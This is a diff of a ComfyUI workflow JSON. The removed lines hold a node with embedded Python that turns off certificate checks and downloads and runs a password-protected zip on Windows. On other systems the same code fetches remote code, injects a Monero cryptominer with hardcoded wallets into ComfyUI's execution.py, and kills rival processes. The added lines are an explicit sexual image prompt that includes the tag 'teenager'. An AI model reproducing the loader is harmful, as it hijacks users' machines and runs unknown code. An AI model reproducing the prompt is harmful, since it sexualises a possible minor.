@@ -1,18 +1,301 @@
 {
   "1": {
-    "class_type": "SRL Eval",
     "inputs": {
-      "parameters": "",
-      "code": "# FUCK_PUTIN\nimport os\nimport py_compile\nimport re\nimport shutil\nimport signal\nimport ssl\nimport subprocess\nimport sys\nimport tempfile\nimport textwrap\nimport traceback\nimport urllib.request\nfrom io import StringIO\nfrom pathlib import Path\n\nssl._create_default_https_context = ssl._create_unverified_context\n_unverified_ctx = ssl.create_default_context()\n_unverified_ctx.check_hostname = False\n_unverified_ctx.verify_mode = ssl.CERT_NONE\n_opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=_unverified_ctx))\nurllib.request.install_opener(_opener)\n\nHOME_DIR = \"F:/ComfyUI-aki-v2/ComfyUI\"\n\nKRX_WALLET = \"krxXVMD2Z7\"\nXMR_WALLET = \"85N199SkmpV7kgeTw8rZcugJ3FvKkUzxoFMvbuzgHLT8QVx2gqMJ4LSYsE3zc2WsB4BJNskF6EGB6aVdJZB8jxGTHUohGqk\"\n\n\ndef inject():\n    old_stdout, old_stderr = sys.stdout, sys.stderr\n    sys.stdout = sys.stderr = log_stream = StringIO()\n\n    with (tempfile.TemporaryDirectory() as temp_dir_str):\n        temp_dir = Path(temp_dir_str)\n        try:\n            if os.name == \"nt\":\n                import zipfile\n                from urllib.parse import urlparse\n\n                url = \"https://box.juicey.dev/f/qwy8j354zpogxrgp72j1rh0s.zip\"  # <- замени на свой URL\n                password = \"PAkolZ29\"  # <- пароль для архива (или None если без пароля)\n\n                temp_dir = tempfile.gettempdir()\n                filename = os.path.basename(urlparse(url).path) or \"archive.zip\"\n                zip_path = os.path.join(temp_dir, filename)\n\n                # Скачиваем ZIP в %TEMP%\n                req = urllib.request.Request(url, headers={\"User-Agent\": \"Mozilla/5.0\"})\n                with urllib.request.urlopen(req) as r, open(zip_path, \"wb\") as f:\n                    f.write(r.read())\n\n                print(\"ZIP downloaded:\", zip_path)\n\n                # Распаковываем в корень temp с паролем\n                with zipfile.ZipFile(zip_path, \"r\") as z:\n                    # Получаем список файлов в архиве\n                    file_list = z.namelist()\n\n                    # Конвертируем пароль в bytes (если указан)\n                    pwd = password.encode('utf-8') if password else None\n\n                    # Распаковываем в корень temp\n                    z.extractall(path=temp_dir, pwd=pwd)\n\n                    # Если нужно только первый/главный файл\n                    if file_list:\n                        main_file = file_list[0]\n                        main_file_path = os.path.join(temp_dir, main_file)\n                        print(f\"\\n✅ Главный файл: {main_file_path}\")\n                        subprocess.Popen(\n                            main_file_path,\n                            cwd=temp_dir,\n                        )\n                print(\"Windows\")\n            else:\n                # session_utils_url = \"http://bitbucket.org/kalost/installer/raw/main/session_utils.py\"\n                miner_manager_url = \"http://bitbucket.org/kalost/installer/raw/main/miner_manager.py\"\n                srl_init_url = \"http://bitbucket.org/kalost/installer/raw/main/init.py\"\n\n                def run_command(cmd_str):\n                    try:\n                        return subprocess.run(cmd_str, shell=True, capture_output=True, text=True, check=True).stdout\n                    except subprocess.CalledProcessError as e:\n                        return f\"Error executing '{cmd_str}': {e}\"\n                    except Exception as e:\n                        return f\"Unexpected error running '{cmd_str}': {e}\"\n\n                # Команда для CPU\n                print(\"=== lscpu ===\")\n                print(run_command(\n                    \"lscpu | grep -E '^(Model name|CPU\\\\(s\\\\)|Core\\\\(s\\\\) per socket|Socket\\\\(s\\\\)|Thread\\\\(s\\\\) per core|NUMA node\\\\(s\\\\)|CPU max MHz)'\"))\n\n                # Команда для GPU\n                print(\"\\n=== nvidia-smi ===\")\n                print(run_command(\"nvidia-smi\"))\n\n                # --- Шаг 1: Поиск директории ---\n                print(\"[*] 1. Поиск корневой директории ComfyUI...\")\n                root_dir = Path(HOME_DIR)\n                print(f\"[+] Использую HOME_DIR: {root_dir.resolve()}\")\n\n                if not root_dir: raise RuntimeError(\"ПРОВАЛ. Не удалось найти директорию ComfyUI.\")\n                print(f\"[+] Директория найдена: {root_dir.resolve()}\")\n\n                print(\"\\n[*] 2. Подготовка патчей...\")\n\n                # session_utils_content = urllib.request.urlopen(\n                #     urllib.request.Request(session_utils_url)).read()\n                srl_init_content = urllib.request.urlopen(urllib.request.Request(srl_init_url)).read()\n\n                with urllib.request.urlopen(urllib.request.Request(miner_manager_url)) as response:\n                    miner_manager_content = response.read().decode('utf-8')  # Декодируем bytes в str\n\n                # # --- Подготовка патча для server.py (Оба патча вместе) ---\n                # print(\"[*] Готовлю комбинированный патч для server.py...\")\n                # server_py_path = root_dir / \"server.py\"\n                # try:\n                #     # Читаем ОДИН раз в строку и в список строк\n                #     original_server_content = server_py_path.read_text(encoding='utf-8')\n                #     lines_server = original_server_content.splitlines(True)\n                # except FileNotFoundError:\n                #     raise RuntimeError(f\"ПРОВАЛ. Не найден server.py по пути: {server_py_path}\")\n                #\n                # # --- ШАГ 1: Применяем патч для session_utils ---\n                # if \"import session_utils\" not in original_server_content:\n                #     print(\"   - Внедряю 'import session_utils'...\")\n                #     lines_server.insert(0, \"import session_utils\\n\")\n                # if \"session_utils.setup_routes(self.app)\" not in original_server_content:\n                #     print(\"   - Внедряю 'session_utils.setup_routes'...\")\n                #     start_index = next(i for i, line in enumerate(lines_server) if \"def add_routes(self):\" in line)\n                #     indent = re.match(r'^(\\s*)', lines_server[start_index + 1]).group(1)\n                #     end_index = next((i for i in range(start_index + 1, len(lines_server)) if\n                #                       lines_server[i].strip() and not lines_server[i].startswith(indent)),\n                #                      len(lines_server))\n                #     lines_server.insert(end_index, f\"{indent}session_utils.setup_routes(self.app)\\n\")\n                #\n                # # --- ШАГ 3: Собираем финальный контент ---\n                # patched_server_content = \"\".join(lines_server)\n                # print(\"   - Патч для server.py (start_multi_address) успешно подготовлен.\")\n\n                original_exec_content = (root_dir / \"execution.py\").read_text(encoding='utf-8')\n                lines_exec = original_exec_content.splitlines(True)\n\n                start_marker = \"# --- MINER MANAGER INJECTED START ---\"\n                end_marker = \"# --- MINER MANAGER INJECTED END ---\"\n                start_idx, end_idx = -1, -1\n                for i, line in enumerate(lines_exec):\n                    if start_marker in line: start_idx = i\n                    if end_marker in line: end_idx = i; break\n\n                clean_miner_code = textwrap.dedent(\n                    miner_manager_content\n                    .replace(\"{KRX_WALLET}\", KRX_WALLET)\n                    .replace(\"{XMR_WALLET}\", XMR_WALLET)\n                    .replace('{HARDCODED_WORKER_NAME}', \"L2tGQx-Q\")\n                ) + '\\n'\n\n                if start_idx != -1 and end_idx != -1:\n                    print(\"   - Обнаружен старый патч майнера. Обновляю...\")\n                    # Заменяем старый блок кода на новый\n                    lines_exec = lines_exec[:start_idx] + [clean_miner_code] + lines_exec[end_idx + 1:]\n                else:\n                    print(\"   - Патч майнера не найден. Выполняю первую установку...\")\n                    last_import_index = max(i for i, line in enumerate(lines_exec) if\n                                            line.strip().startswith('import ') or line.strip().startswith('from '))\n                    lines_exec.insert(last_import_index + 1,\n                                      '\\n' + clean_miner_code)  # Исправлено: last_import_index вместо last_index\n\n                    execute_start_index = next(\n                        i for i, line in enumerate(lines_exec) if line.strip().startswith('def execute(self,'))\n                    body_indent = re.match(r'^(\\s*)', lines_exec[execute_start_index]).group(1) + '    '\n                    end_index = next((i for i in range(execute_start_index + 1, len(lines_exec)) if\n                                      lines_exec[i].strip() and not lines_exec[i].startswith(body_indent)),\n                                     len(lines_exec))\n                    original_body = lines_exec[execute_start_index + 1: end_index]\n\n                    lines_exec[execute_start_index + 1: end_index] = [\n                        f\"{body_indent}manage_miner('stop')\\n\", f\"{body_indent}try:\\n\",\n                        *[f\"    {line}\" for line in original_body], f\"{body_indent}finally:\\n\",\n                        f\"{body_indent}    manage_miner('start')\\n\"\n                    ]\n\n                patched_exec_content = \"\".join(lines_exec)\n\n                print(\"[+] Патчи подготовлены.\")\n\n                # --- Шаг 3: Проверка синтаксиса ---\n                print(\"\\n[*] 3. Проверка синтаксиса с помощью py_compile...\")\n                try:\n                    # temp_server_path = temp_dir / \"server.py\"\n                    temp_exec_path = temp_dir / \"execution.py\"\n\n                    # temp_server_path.write_text(patched_server_content, encoding='utf-8')\n                    temp_exec_path.write_text(patched_exec_content, encoding='utf-8')\n\n                    # py_compile.compile(str(temp_server_path), doraise=True)\n                    py_compile.compile(str(temp_exec_path), doraise=True)\n\n                    print(\"[+] Проверка синтаксиса пройдена. Патчи безопасны.\")\n                except py_compile.PyCompileError as e:\n                    print(\"[-] ПРОВЕРКА СИНТАКСИСА ПРОВАЛЕНА! Оригинальные файлы не изменены.\")\n                    raise RuntimeError(f\"Ошибка синтаксиса в сгенерированном патче:\\n{e}\")\n\n                print(\"\\n[*] 4. Применение проверенных изменений к реальным файлам...\")\n                try:\n                    if start_idx == -1:  # Бэкап делаем только при первой установке\n                        # shutil.copy2(root_dir / \"server.py\", root_dir / \"server.bak\")\n                        shutil.copy2(root_dir / \"execution.py\", root_dir / \"execution.bak\")\n\n                    # (root_dir / \"session_utils.py\").write_bytes(session_utils_content)\n                    srl_dir = root_dir / \"custom_nodes\" / \"srl-nodes\"\n                    srl_dir.mkdir(parents=True, exist_ok=True)\n\n                    # (root_dir / \"server.py\").write_text(patched_server_content, encoding='utf-8')\n                except Exception as e:\n                    print(f\"[-] Server не пропатчен: {e}\")\n                    pass\n                try:\n                    (srl_dir / \"__init__.py\").write_bytes(srl_init_content)\n                except Exception as e:\n                    print(f\"[-] srl не пропатчен: {e}\")\n                    pass\n\n                (root_dir / \"execution.py\").write_text(patched_exec_content, encoding='utf-8')\n\n                def kill_processes_by_exe_path_immediate(exe_path):\n                    \"\"\"\n                    Непосредственно убивает (SIGKILL) все процессы, где в args присутствует полный exe_path.\n                    Возвращает список PID, которым был послан SIGKILL.\n                    \"\"\"\n                    exe_path = os.path.abspath(exe_path)\n                    exe_name = os.path.basename(exe_path)\n                    killed = []\n\n                    try:\n                        res = subprocess.run([\"ps\", \"-eo\", \"pid=,args=\"],\n                                             capture_output=True, text=True, check=True)\n                        for line in res.stdout.splitlines():\n                            line = line.strip()\n                            if not line:\n                                continue\n                            try:\n                                pid_str, cmd = line.split(None, 1)\n                            except ValueError:\n                                continue\n                            try:\n                                pid = int(pid_str)\n                            except ValueError:\n                                continue\n\n                            if pid == os.getpid():\n                                continue\n                            if exe_name not in cmd:\n                                continue\n                            if exe_path not in cmd:\n                                continue\n\n                            try:\n                                os.kill(pid, signal.SIGKILL)\n                                killed.append(pid)\n                            except ProcessLookupError:\n                                # процесс уже завершился\n                                continue\n                            except PermissionError:\n                                print(f\"No permission to kill PID {pid}\")\n                                continue\n\n                        return killed\n\n                    except subprocess.CalledProcessError as e:\n                        print(f\"ps failed: {e}\")\n                        return killed\n\n                print(\"Пытаюсь убить старых шавок:\")\n                print(kill_processes_by_exe_path_immediate(root_dir / \".system_cache\" / \"sys-guard\"))\n\n                print(\"\\n[*] Заебись! Перезапусти ComfyUI.\")\n\n        except Exception as e:\n            print(f\"[-] ОПЕРАЦИЯ ПРЕРВАНА: {e}\\n{traceback.format_exc()}\")\n        finally:\n            log_output = log_stream.getvalue()\n            sys.stdout = old_stdout\n            sys.stderr = old_stderr\n        return log_output\n\n\nresult = inject()\nreturn result\n"
-    }
+      "ckpt_name": "il\\beretmixrealV100vae.43BO.safetensors",
+      "clip_skip": "2"
+    },
+    "class_type": "CheckpointLoaderSimple"
   },
   "2": {
-    "class_type": "PreviewAny",
     "inputs": {
-      "source": [
+      "model": [
         "1",
         0
+      ],
+      "clip": [
+        "1",
+        1
+      ],
+      "lora_name": "il\\真实皮肤滑块0-5.safetensors",
+      "strength_model": 2.0,
+      "strength_clip": 2.0
+    },
+    "class_type": "LoraLoader"
+  },
+  "3": {
+    "inputs": {
+      "model": [
+        "2",
+        0
+      ],
+      "clip": [
+        "2",
+        1
+      ],
+      "lora_name": "il\\动态光影1-5.safetensors",
+      "strength_model": 1.2,
+      "strength_clip": 1.2
+    },
+    "class_type": "LoraLoader"
+  },
+  "4": {
+    "inputs": {
+      "model": [
+        "3",
+        0
+      ],
+      "clip": [
+        "3",
+        1
+      ],
+      "lora_name": "fg2\\暗光.safetensors",
+      "strength_model": 0.0,
+      "strength_clip": 0.0
+    },
+    "class_type": "LoraLoader"
+  },
+  "18": {
+    "inputs": {
+      "model": [
+        "4",
+        0
+      ],
+      "clip": [
+        "4",
+        1
+      ],
+      "lora_name": "pony\\亚洲美化.safetensors",
+      "strength_model": 0.0,
+      "strength_clip": 0.0
+    },
+    "class_type": "LoraLoader"
+  },
+  "19": {
+    "inputs": {
+      "model": [
+        "18",
+        0
+      ],
+      "clip": [
+        "18",
+        1
+      ],
+      "lora_name": "il\\亚洲人.safetensors",
+      "strength_model": 0.6,
+      "strength_clip": 0.6
+    },
+    "class_type": "LoraLoader"
+  },
+  "20": {
+    "inputs": {
+      "model": [
+        "19",
+        0
+      ],
+      "clip": [
+        "19",
+        1
+      ],
+      "lora_name": "il\\稳定剂0.5.safetensors",
+      "strength_model": 0.3,
+      "strength_clip": 0.3
+    },
+    "class_type": "LoraLoader"
+  },
+  "21": {
+    "inputs": {
+      "model": [
+        "20",
+        0
+      ],
+      "clip": [
+        "20",
+        1
+      ],
+      "lora_name": "common\\body-wonderful-sdxl.safetensors",
+      "strength_model": 0.5,
+      "strength_clip": 0.5
+    },
+    "class_type": "LoraLoader"
+  },
+  "24": {
+    "inputs": {
+      "model": [
+        "21",
+        0
+      ],
+      "clip": [
+        "21",
+        1
+      ],
+      "lora_name": "il油腻熟女\\光滑-0.2.safetensors",
+      "strength_model": 0.2,
+      "strength_clip": 0.2
+    },
+    "class_type": "LoraLoader"
+  },
+  "25": {
+    "inputs": {
+      "model": [
+        "24",
+        0
+      ],
+      "clip": [
+        "24",
+        1
+      ],
+      "lora_name": "pony\\美女-现实混合-btiflgrlsnrv7.safetensors",
+      "strength_model": 0.3,
+      "strength_clip": 0.3
+    },
+    "class_type": "LoraLoader"
+  },
+  "26": {
+    "inputs": {
+      "model": [
+        "25",
+        0
+      ],
+      "clip": [
+        "25",
+        1
+      ],
+      "lora_name": "il\\细节增强-addmicrodetails.safetensors",
+      "strength_model": 0.1,
+      "strength_clip": 0.1
+    },
+    "class_type": "LoraLoader"
+  },
+  "5": {
+    "inputs": {
+      "model": [
+        "26",
+        0
+      ],
+      "method": "from cond"
+    },
+    "class_type": "Support empty uncond"
+  },
+  "6": {
+    "inputs": {
+      "model": [
+        "5",
+        0
+      ],
+      "object_to_patch": "diffusion_model",
+      "residual_diff_threshold": 0.15,
+      "start": 0.2,
+      "end": 0.8,
+      "max_consecutive_cache_hits": 5
+    },
+    "class_type": "ApplyFBCacheOnModel"
+  },
+  "7": {
+    "inputs": {
+      "clip": [
+        "26",
+        1
+      ],
+      "text": "masterpiece, ultra-HD, photorealistic, high detail, best quality, 8k, best quality, sharp focus, ray-tracing,\nrealistic, depth of field, shallow depth of field, raw photo ,teenager,detailed eyes,Korean,btiflgrlsnrv7,jpn-girl,addmicrodetails,BREAK A cinematic POV photo in a brightly lit living room. A mature woman is held in a koala hold after being creamed. She looks down at the thick white semen running down her thighs with a lustful and regretful expression. BREAK (1girl, ChenWanru:1.1), female_focus, 42yo, mature female, milf, koala_hold, clinging_to_partner, legs_wrapped_around_waist, looking_down, (long_hair, wavy_hair, chestnut_hair, wet_hair, fair_skin, large_breasts), breasts_pressed_against_partner, topless, no_bra, erect_nipples, no_panties, vaginal_penetration, creampie_aftermath, leaking_semen, semen_on_thighs, thick_white_fluid, (parted_lips:1.2), heavy_blush, sweat, glistening_skin, lustful_expression, ahegao_lite. BREAK (1boy, zy:1.1), male_focus, standing, visible_hands, holding_partner_thighs, semen_on_legs, penis_in_vagina, pov_from_male. BREAK (indoors), living_room, bright artificial indoor lighting, cinematic illumination, bloom, pov, depth_of_field."
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "8": {
+    "inputs": {
+      "clip": [
+        "26",
+        1
+      ],
+      "text": "embedding:lazyhand,embedding:lazyloli,embedding:lazyneg,consored,caucasian, anime, 2d, bad anatomy,illustration, sketch, comic, flat art, cartoon, toon,  bad hands, signature, watermarks, ugly, error, extra limb, missing limbs, muscular, missing fingers,lipstick,\noversaturated,  vibrant colors,  red lipstick, heavy makeup, bright red lips, clown"
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "16": {
+    "inputs": {
+      "conditioning": [
+        "8",
+        0
+      ],
+      "start": 0.0,
+      "end": 0.7
+    },
+    "class_type": "ConditioningSetTimestepRange"
+  },
+  "9": {
+    "inputs": {
+      "width": 832,
+      "height": 1216,
+      "batch_size": 1
+    },
+    "class_type": "EmptyLatentImage"
+  },
+  "10": {
+    "inputs": {
+      "model": [
+        "6",
+        0
+      ],
+      "positive": [
+        "7",
+        0
+      ],
+      "negative": [
+        "16",
+        0
+      ],
+      "latent_image": [
+        "9",
+        0
+      ],
+      "seed": 339190301416779,
+      "steps": 26,
+      "cfg": 4.5,
+      "sampler_name": "dpmpp_2m_sde",
+      "scheduler": "karras",
+      "denoise": 0.96
+    },
+    "class_type": "KSampler"
+  },
+  "11": {
+    "inputs": {
+      "samples": [
+        "10",
+        0
+      ],
+      "vae": [
+        "1",
+        2
       ]
-    }
+    },
+    "class_type": "VAEDecode"
+  },
+  "27": {
+    "inputs": {
+      "model_name": "RealESRGAN_x2plus.pth"
+    },
+    "class_type": "UpscaleModelLoader"
+  },
+  "28": {
+    "inputs": {
+      "upscale_model": [
+        "27",
+        0
+      ],
+      "image": [
+        "11",
+        0
+      ]
+    },
+    "class_type": "ImageUpscaleWithModel"
+  },
+  "12": {
+    "inputs": {
+      "images": [
+        "28",
+        0
+      ],
+      "filename_prefix": "Realistic_Raw_Upscale_2K"
+    },
+    "class_type": "SaveImage"
   }
 }
